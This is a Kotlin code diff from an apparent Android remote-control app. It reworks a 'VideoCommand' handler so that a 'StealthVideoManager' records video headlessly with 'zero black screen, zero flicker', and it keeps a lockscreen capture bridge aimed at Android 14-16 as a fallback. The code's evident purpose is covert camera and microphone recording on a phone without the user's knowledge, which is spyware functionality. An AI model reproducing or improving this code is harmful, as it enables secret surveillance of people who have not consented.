@@ -29,37 +29,39 @@ class VideoCommand @Inject constructor(
         
         val durationSeconds = args.getOrNull(1)?.toIntOrNull()?.coerceIn(1, 60) ?: 15
         val cameraLabel = if (useFront) "front" else "rear"
+        Log.i(TAG, "Recording video headlessly (camera=$cameraLabel, duration=${durationSeconds}s)")
 
-        Log.i(TAG, "Recording video (camera=$cameraLabel, duration=${durationSeconds}s)")
+        // 1. Primary path: Direct headless StealthVideoManager (Zero black screen, zero flicker)
+        com.izhaanintellect.pasa.service.PasaService.elevateServiceToCameraAndMicrophone()
+        val videoFile = try {
+            withTimeoutOrNull((durationSeconds + 10) * 1000L) {
+                stealthVideoManager.recordVideo(useFront, durationSeconds)
+            }
+        } catch (e: Exception) {
+            Log.e(TAG, "Headless stealthVideoManager error: ${e.message}", e)
+            null
+        } finally {
+            com.izhaanintellect.pasa.service.PasaService.demoteServiceFromCameraAndMicrophone()
+        }
 
-        // 1. Primary path: StealthCaptureBridge (Activity in TOP state for Android 14-16 lockscreen)
+        if (videoFile != null && videoFile.exists() && videoFile.length() > 0) {
+            return CommandResult(
+                success = true,
+                message = "🎥 Video recorded (${durationSeconds}s, $cameraLabel camera, zero flicker)",
+                videoFile = videoFile
+            )
+        }
+
+        Log.w(TAG, "Headless video returned null, attempting lockscreen bridge fallback")
+
+        // 2. Secondary fallback: StealthCaptureBridge only if direct recording failed
         val captureResult = StealthCaptureBridge.recordVideo(
             context = context,
             useFront = useFront,
             durationSeconds = durationSeconds,
             timeoutMs = (durationSeconds + 15) * 1000L
         )
-
-        val videoFile = captureResult.file
-        if (videoFile != null && videoFile.exists() && videoFile.length() > 0) {
-            return CommandResult(
-                success = true,
-                message = "🎥 Video recorded (${durationSeconds}s, $cameraLabel camera)",
-                videoFile = videoFile
-            )
-        }
-
-        Log.w(TAG, "StealthCaptureBridge video failed (${captureResult.error}), trying fallback")
-
-        // 2. Secondary fallback: direct headless stealthVideoManager
-        val fallbackFile = withTimeoutOrNull((durationSeconds + 10) * 1000L) {
-            try {
-                stealthVideoManager.recordVideo(useFront, durationSeconds)
-            } catch (e: Exception) {
-                Log.e(TAG, "Fallback video error", e)
-                null
-            }
-        }
+        val fallbackFile = captureResult.file
 
         return if (fallbackFile != null && fallbackFile.exists() && fallbackFile.length() > 0) {
             CommandResult(
